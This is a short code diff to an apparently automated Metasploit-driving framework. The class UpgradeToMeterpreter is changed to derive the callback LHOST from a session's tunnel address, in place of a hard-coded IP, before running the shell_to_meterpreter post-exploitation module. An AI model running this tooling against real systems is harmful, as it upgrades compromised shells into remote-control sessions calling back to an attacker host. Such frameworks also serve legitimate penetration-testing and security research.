@@ -129,13 +129,17 @@ class UpgradeToMeterpreter(MSFAction):
         print(target_sessions[session_id])
         # need to identify the LHOST from the session
         ltunnel = target_sessions[session_id]["tunnel_local"]
-        tunnel_conn = re.match("(.*)-(.*):(.*)",ltunnel)
+        tunnel_conn = re.match("(.*):(.*)",ltunnel)
         print(tunnel_conn)
-        direct_conn = re.match("(.*):(.*)",ltunnel)
-        print(direct_conn)
-
+        tunnel = re.match("(.*)-(.*)",tunnel_conn[1])
+        print(tunnel)
+        if tunnel:
+            lhost = tunnel[1]
+        else:
+            lhost = tunnel_conn[1]
+        print(lhost)
         output = session_handler.execute_module(mtype='post', mname='multi/manage/shell_to_meterpreter',
-                opts={'SESSION': session_id, 'LHOST': "10.46.64.10", "verbose": "true"})
+                opts={'SESSION': session_id, 'LHOST': lhost, "verbose": "true"})
         obs.add_raw_obs(output)
         obs.set_success(False)
         session = None
